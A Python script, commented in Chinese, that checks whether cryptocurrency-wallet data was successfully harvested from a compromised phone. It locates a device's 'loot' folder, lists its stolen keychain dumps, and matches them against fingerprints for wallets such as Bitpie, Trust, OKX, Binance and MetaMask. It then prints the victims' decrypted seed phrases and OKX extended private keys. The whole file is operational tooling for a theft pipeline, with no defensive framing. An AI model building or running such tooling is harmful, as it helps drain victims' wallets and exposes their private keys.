#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""check_wallet_collect.py — 一台 18 链设备的「钱包采集到位没」一键巡检

用法:
    python3 scripts/check_wallet_collect.py <IP或序列号或loot目录名>

输出 4 段：
  ① 采到的 wallet-* 类目（对比其它设备应该有什么）
  ② keychain 快照列表（时间 + 条目数）
  ③ 各钱包的密钥条目在不在（Bitpie / Trust / Bitget / OKX / Binance …）
  ④ 已解出的助记词（读 adm888app/data/wallet18.json）
"""
import sys
import os
import re
import json
import glob
import base64
import datetime
import collections

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOOT = os.path.join(ROOT, 'loot')
W18 = os.path.join(ROOT, 'adm888app', 'data', 'wallet18.json')

# 各钱包的「密钥落点」指纹：命中即说明该钱包的关键条目进来了
FINGERPRINTS = [
    ('Bitpie',  r'seedPhraseEntropy',                 'keychain:seedPhraseEntropy → 可自动解助记词'),
    ('Trust',   r'trustwallet',                       'keychain:trustwallet* 口令（助记词在 keystore 文件里）'),
    ('Bitget',  r'_bitkeep_secure_storage',           'keychain:密文仓库（BG@@BG_* / kPKey）→ 服务端解不开'),
    ('OKX',     r'okex_wallet',                       'keychain:加密 blob（非明文助记词）'),
    ('OKX-DB',  r'^0FE27E42.*_Documents_wallet$',     '沙盒 SQLite → 出 xpriv 明文 + 链地址'),
    ('Binance', r'com\.binance\.SKVS',                'keychain:SKVS salt → 服务端解不开'),
    ('MetaMask', r'io\.metamask\.MetaMask',           'keychain'),
    ('imToken', r'im\.token\.app',                    'keychain'),
    ('TronLink', r'com\.tronlink\.hdwallet',          'keychain'),
    ('Phantom', r'app\.phantom',                      'keychain'),
    ('OneKey',  r'so\.onekey\.wallet',                'keychain'),
    ('Gnosis',  r'io\.gnosis\.multisig',              'keychain'),
]


def ts_str(ms):
    try:
        return datetime.datetime.fromtimestamp(int(ms) / 1000, datetime.UTC).strftime('%H:%M:%S')
    except Exception:
        return '?'


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return 1
    key = sys.argv[1]
    d = os.path.join(LOOT, key)
    if not os.path.isdir(d):
        cand = [x for x in glob.glob(os.path.join(LOOT, '*')) if key.lower() in os.path.basename(x).lower()]
        if len(cand) == 1:
            d = cand[0]
        else:
            # 按序列号找：每个 loot 子目录抽一个 parsed.json 读 deviceSerial（带缓存）
            cache = '/tmp/_serial2dir.json'
            m = {}
            try:
                m = json.load(open(cache))
            except Exception:
                m = {}
            hit = m.get(key)
            if hit and os.path.isdir(hit):
                d = hit
            else:
                for sub in sorted(glob.glob(os.path.join(LOOT, '*'))):
                    if not os.path.isdir(sub):
                        continue
                    sn = m.get('__rev__' + sub)
                    if sn is None:
                        sn = ''
                        for p in glob.glob(os.path.join(sub, 'ext_stats_*.bin.parsed.json'))[:1]:
                            try:
                                sn = json.load(open(p, encoding='utf-8')).get('deviceSerial') or ''
                            except Exception:
                                sn = ''
                        m['__rev__' + sub] = sn
                    if sn:
                        m[sn] = sub
                    if sn == key:
                        d = sub
                        break
                try:
                    json.dump(m, open(cache, 'w'))
                except Exception:
                    pass
            if not os.path.isdir(d):
                print('找不到设备: %s（既不是 loot 目录名，也不是已采集过的序列号）' % key)
                return 2
    name = os.path.basename(d)
    serial = ''
    for p in glob.glob(os.path.join(d, 'ext_stats_*.bin.parsed.json'))[:200]:
        try:
            j = json.load(open(p, encoding='utf-8'))
        except Exception:
            continue
        serial = j.get('deviceSerial') or ''
        if serial:
            break
    print('设备目录 %s   序列号 %s' % (name, serial or '?'))

    # ① wallet-* 类目
    cats = collections.Counter()
    paths = {}
    for p in glob.glob(os.path.join(d, 'ext_stats_*.bin.parsed.json')):
        try:
            j = json.load(open(p, encoding='utf-8'))
        except Exception:
            continue
        c = str(j.get('category') or '')
        cats[c] += 1
        paths.setdefault(c, str(j.get('path') or ''))
    print('\n① 采到的类目（wallet-* 单列）')
    wcats = {k: v for k, v in cats.items() if k.startswith('wallet-')}
    if wcats:
        for k, v in sorted(wcats.items(), key=lambda x: -x[1]):
            print('   %6d  %-40s %s' % (v, k, paths.get(k, '')[:40]))
    else:
        print('   ⚠️ 没有任何 wallet-* 类目 —— 钱包容器一个都没采到')
    print('   其它类目: %s' % ', '.join('%s×%d' % (k, v) for k, v in
                                  sorted(cats.items(), key=lambda x: -x[1]) if not k.startswith('wallet-'))[:160])

    # ② keychain 快照
    snaps = []
    for p in glob.glob(os.path.join(d, 'ext_stats_*.bin')):
        try:
            j = json.load(open(p, encoding='utf-8'))
        except Exception:
            continue
        if 'keychain_dump' in str(j.get('path') or ''):
            ts = int(re.search(r'_(\d+)\.bin', p).group(1))
            snaps.append((ts, len(j.get('data') or '')))
    snaps.sort()
    print('\n② keychain 快照 %d 个' % len(snaps))
    for ts, n in snaps[-5:]:
        print('   %s  (%d base64 字符)' % (ts_str(ts), n))
    if not snaps:
        print('   ⚠️ 没有 keychain dump —— 所有 keychain 类助记词都拿不到')
    elif len(set(n for _, n in snaps)) == 1 and len(snaps) > 1:
        print('   ⚠️ 所有快照大小完全相同 → 内容可能都一样（没有新条目进来）')

    # ③ 指纹
    print('\n③ 各钱包密钥条目')
    txt = ''
    if snaps:
        # 取【最后一次】keychain 快照的明文（按时间选，不能按"最近 N 个文件"选
        # —— 后期会有大量同类目文件把窗口挤掉）
        kc = []
        for p in glob.glob(os.path.join(d, 'ext_stats_*.bin')):
            try:
                j = json.load(open(p, encoding='utf-8'))
            except Exception:
                continue
            if 'keychain_dump' in str(j.get('path') or '') and j.get('data'):
                kc.append((int(re.search(r'_(\d+)\.bin', p).group(1)), p))
        kc.sort()
        if kc:
            try:
                j = json.load(open(kc[-1][1], encoding='utf-8'))
                txt = base64.b64decode(j['data']).decode('utf-8', 'replace')
            except Exception:
                txt = ''
    allpaths = []
    for p in glob.glob(os.path.join(d, 'ext_stats_*.bin.parsed.json')):
        try:
            j = json.load(open(p, encoding='utf-8'))
        except Exception:
            continue
        allpaths.append(str(j.get('path') or ''))
    for app, pat, note in FINGERPRINTS:
        hit_kc = bool(txt and re.search(pat, txt, re.M))
        hit_fp = bool([x for x in allpaths if re.search(pat, x)])
        mark = '✅' if (hit_kc or hit_fp) else '❌'
        print('   %s %-10s %s' % (mark, app, note if (hit_kc or hit_fp) else '（未采到）'))

    # ④ 解出的助记词
    print('\n④ 已解出助记词')
    try:
        wj = json.load(open(W18, encoding='utf-8'))
        e = wj.get(serial) or {}
        ws = e.get('wallets') or []
        if ws:
            for w in ws:
                print('   ✅ %-8s %s' % (w.get('app'), (w.get('mnemonic') or '')[:60]))
        else:
            print('   ❌ 0 条  (status=%s %s)' % (e.get('status', ''), (e.get('status_text') or '')[:60]))
        o = e.get('okx')
        if o:
            print('   ℹ️ OKX 账户密钥已提取: xpriv=%s…  地址 %d 条' % (o.get('xpriv', '')[:16], len(o.get('addresses') or [])))
    except Exception as ex:
        print('   读 wallet18.json 失败:', ex)
    return 0


if __name__ == '__main__':
    sys.exit(main())
